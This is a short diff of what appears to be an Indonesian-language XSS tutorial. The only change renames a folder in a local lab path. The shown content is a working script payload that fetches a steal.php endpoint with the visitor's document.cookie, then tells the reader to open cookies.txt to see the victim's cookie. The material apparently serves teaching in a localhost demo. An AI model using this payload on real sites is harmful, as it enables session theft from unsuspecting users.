@@ -55,7 +55,7 @@ html
 Salin
 Edit
 <script>
-  fetch('http://localhost/demo-xss/steal.php?cookie=' + encodeURIComponent(document.cookie))
+  fetch('http://localhost/xss-demo/steal.php?cookie=' + encodeURIComponent(document.cookie))
 </script>
 3. Cek file cookies.txt
 Buka cookies.txt di folder project. Di sana akan muncul cookie korban seperti:
